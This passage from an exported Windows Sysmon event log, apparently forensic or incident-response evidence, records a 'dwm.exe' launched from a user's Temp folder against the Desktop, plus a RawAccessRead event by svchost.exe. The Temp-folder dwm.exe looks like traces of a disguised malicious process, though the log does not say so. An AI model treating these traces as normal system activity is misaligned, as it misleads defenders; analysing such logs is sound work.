LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:23:52,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:23:52.454
ProcessGuid: {CC41BF7E-4CD1-5A01-0000-0010EF070100}
ProcessId: 96
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2"
